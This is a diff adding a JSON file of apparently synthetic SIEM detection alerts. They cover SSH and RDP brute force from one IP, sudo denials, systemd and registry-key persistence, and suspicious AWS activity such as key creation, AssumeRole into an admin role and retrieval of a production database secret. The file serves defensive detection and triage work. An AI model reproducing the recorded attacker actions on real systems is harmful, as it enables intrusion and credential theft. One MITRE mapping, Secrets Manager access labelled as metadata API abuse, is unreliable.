+          "timestamp": "2026-02-17T06:45:02",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "mysql",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000531",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:45:04",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "oracle",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000532",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:45:05",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "root",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        }
+      ],
+      "group_key": "203.0.113.45"
+    }
+  },
+  {
+    "alert_id": "ALT-1CBB757B",
+    "rule_id": "DET-005",
+    "rule_name": "Unauthorized Sudo Attempt",
+    "description": "User not in sudoers file attempted to execute command as root",
+    "severity": "HIGH",
+    "mitre_technique": "T1548.003",
+    "mitre_tactic": "Privilege Escalation",
+    "mitre_name": "Sudo and Sudo Caching",
+    "timestamp": "2026-02-17T08:02:00",
+    "created_at": "2026-02-19T11:27:32.558337",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Investigate the user account. Check for lateral movement evidence.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000643",
+          "source": "linux_auth",
+          "event_type": "privilege_escalation",
+          "timestamp": "2026-02-17T08:02:00",
+          "details": {
+            "username": "www-data",
+            "command": "/bin/bash",
+            "action": "sudo_denied",
+            "unauthorized": true
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-CD39FBCE",
+    "rule_id": "DET-012",
+    "rule_name": "Suspicious Systemd Service Created",
+    "description": "New systemd service installed, potential persistence mechanism",
+    "severity": "HIGH",
+    "mitre_technique": "T1543.002",
+    "mitre_tactic": "Persistence",
+    "mitre_name": "Create or Modify System Process: Systemd Service",
+    "timestamp": "2026-02-17T11:00:05",
+    "created_at": "2026-02-19T11:27:32.560525",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Review service definition. Check for suspicious ExecStart commands.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000710",
+          "source": "linux_auth",
+          "event_type": "service_activity",
+          "timestamp": "2026-02-17T11:00:05",
+          "details": {
+            "action": "systemd_activity",
+            "message": "[1]: Created slice system-update.service."
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-6AFD74CE",
+    "rule_id": "DET-002",
+    "rule_name": "Windows RDP Brute Force Detected",
+    "description": "Multiple failed Windows logon attempts (Event 4625) from the same source IP",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T11:38:39.744747",
+    "created_at": "2026-02-19T11:27:32.557859",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Threshold exceeded: 82 events from 203.0.113.45",
+    "recommended_response": "Block source IP. Enable account lockout policies. Review RDP exposure.",
+    "evidence": {
+      "event_count": 82,
+      "sample_events": [
+        {
+          "event_id": "EVT-000728",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:36:00",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "admin",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "An incorrect password was supplied",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000729",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:36:01.114803",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "dbadmin",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "An incorrect password was supplied",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000730",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:36:02.836112",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "guest",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The specified user does not exist",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000731",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:36:03.639481",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "jsmith",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The user account is disabled",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000732",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:36:03.803871",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "jsmith",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The user account has been locked out",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        }
+      ],
+      "group_key": "203.0.113.45"
+    }
+  },
+  {
+    "alert_id": "ALT-536545E5",
+    "rule_id": "DET-013",
+    "rule_name": "Registry Run Key Modification",
+    "description": "Windows Registry Run/RunOnce key modified for persistence",
+    "severity": "HIGH",
+    "mitre_technique": "T1547.001",
+    "mitre_tactic": "Persistence",
+    "mitre_name": "Boot or Logon Autostart Execution: Registry Run Keys",
+    "timestamp": "2026-02-17T16:00:00",
+    "created_at": "2026-02-19T11:27:32.560651",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Review the registry value. Remove unauthorized entries. Scan the binary.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001063",
+          "source": "windows_sysmon",
+          "event_type": "registry_modification",
+          "timestamp": "2026-02-17T16:00:00",
+          "details": {
+            "event_type": "SetValue",
+            "image": "C:\\Windows\\System32\\cmd.exe",
+            "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdater",
+            "details": "\"C:\\Windows\\Temp\\svc.exe -hidden\"",
+            "user": "CORPSEC\\svc_backup",
+            "action": "registry_value_set"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-2659B0D9",
+    "rule_id": "DET-014",
+    "rule_name": "AWS API Call from Anomalous Region",
+    "description": "AWS API calls originating from an unusual geographic region",
+    "severity": "HIGH",
+    "mitre_technique": "T1078.004",
+    "mitre_tactic": "Initial Access",
+    "mitre_name": "Valid Accounts: Cloud Accounts",
+    "timestamp": "2026-02-17T18:00:00",
+    "created_at": "2026-02-19T11:27:32.560739",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Verify the API calls are authorized. Rotate access keys if unauthorized.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001075",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T18:00:00",
+          "details": {
+            "event_name": "GetCallerIdentity",
+            "event_source": "sts.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {},
+            "error_code": null,
+            "action": "GetCallerIdentity"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-94E57463",
+    "rule_id": "DET-017",
+    "rule_name": "AWS Access Key Created",
+    "description": "New access key created for an IAM user",
+    "severity": "HIGH",
+    "mitre_technique": "T1098.001",
+    "mitre_tactic": "Persistence",
+    "mitre_name": "Account Manipulation: Additional Cloud Credentials",
+    "timestamp": "2026-02-17T18:00:00",
+    "created_at": "2026-02-19T11:27:32.561338",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Verify key creation was authorized. If not, disable the new key immediately.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001076",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T18:00:00",
+          "details": {
+            "event_name": "CreateAccessKey",
+            "event_source": "iam.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {
+              "UserName": "dev-ops-svc"
+            },
+            "error_code": null,
+            "action": "CreateAccessKey"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-DF7243E0",
+    "rule_id": "DET-015",
+    "rule_name": "AWS IAM User Created",
+    "description": "New IAM user created, potential persistence via cloud accounts",
+    "severity": "HIGH",
+    "mitre_technique": "T1136.003",
+    "mitre_tactic": "Persistence",
+    "mitre_name": "Create Account: Cloud Account",
+    "timestamp": "2026-02-17T18:20:00",
+    "created_at": "2026-02-19T11:27:32.560958",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Verify user creation was authorized. Check for additional escalation.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001085",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T18:20:00",
+          "details": {
+            "event_name": "CreateUser",
+            "event_source": "iam.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {
+              "UserName": "svc-cloudops"
+            },
+            "error_code": null,
+            "action": "CreateUser"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-3ED4EF38",
+    "rule_id": "DET-021",
+    "rule_name": "AWS Assume Role from Unusual Source",
+    "description": "AssumeRole API call from an unusual IP or with unusual session name",
+    "severity": "HIGH",
+    "mitre_technique": "T1550.001",
+    "mitre_tactic": "Lateral Movement",
+    "mitre_name": "Use Alternate Authentication Material: Application Access Token",
+    "timestamp": "2026-02-17T18:32:00",
+    "created_at": "2026-02-19T11:27:32.561797",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Review role trust policies. Verify the session is legitimate.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001091",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T18:32:00",
+          "details": {
+            "event_name": "AssumeRole",
+            "event_source": "sts.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {
+              "RoleArn": "arn:aws:iam::123456789012:role/AdminRole",
+              "RoleSessionName": "maintenance"
+            },
+            "error_code": null,
+            "action": "AssumeRole"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-50C17FEC",
+    "rule_id": "DET-020",
+    "rule_name": "AWS Secrets Manager Access",
+    "description": "Sensitive secret value retrieved from Secrets Manager",
+    "severity": "HIGH",
+    "mitre_technique": "T1552.005",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Unsecured Credentials: Cloud Instance Metadata API",
+    "timestamp": "2026-02-17T18:56:00",
+    "created_at": "2026-02-19T11:27:32.561705",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Verify secret access was authorized. Rotate the secret if compromised.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001099",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T18:56:00",
+          "details": {
+            "event_name": "GetSecretValue",
+            "event_source": "secretsmanager.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {
+              "SecretId": "prod/database/credentials"
+            },
+            "error_code": null,
+            "action": "GetSecretValue"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-E04334F9",
+    "rule_id": "DET-018",
+    "rule_name": "AWS Console Login Without MFA",
+    "description": "Console login detected without multi-factor authentication",
+    "severity": "HIGH",
+    "mitre_technique": "T1078.004",
+    "mitre_tactic": "Initial Access",
+    "mitre_name": "Valid Accounts: Cloud Accounts",
+    "timestamp": "2026-02-17T19:00:00",
+    "created_at": "2026-02-19T11:27:32.561442",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Enforce MFA for all console access. Investigate the login context.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001101",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T19:00:00",
+          "details": {
+            "event_name": "ConsoleLogin",
+            "event_source": "signin.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {},
+            "error_code": null,
+            "action": "ConsoleLogin"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-C66B6BD6",
+    "rule_id": "DET-004",
+    "rule_name": "Login from External/Unknown IP",
+    "description": "Successful login from an IP outside known internal ranges",
+    "severity": "MEDIUM",
+    "mitre_technique": "T1078",
+    "mitre_tactic": "Initial Access",
+    "mitre_name": "Valid Accounts",
+    "timestamp": "2026-02-17T05:25:34.500000",
+    "created_at": "2026-02-19T11:27:32.558129",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Verify if the login is authorized. Check VPN logs for context.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000204",
+          "source": "windows_security",
+          "event_type": "authentication_success",
+          "timestamp": "2026-02-17T05:25:34.500000",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "svc_backup",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "service": "windows_logon",
+            "action": "successful_login"
+          }
+        }
+      ]
+    }
+  }
+]
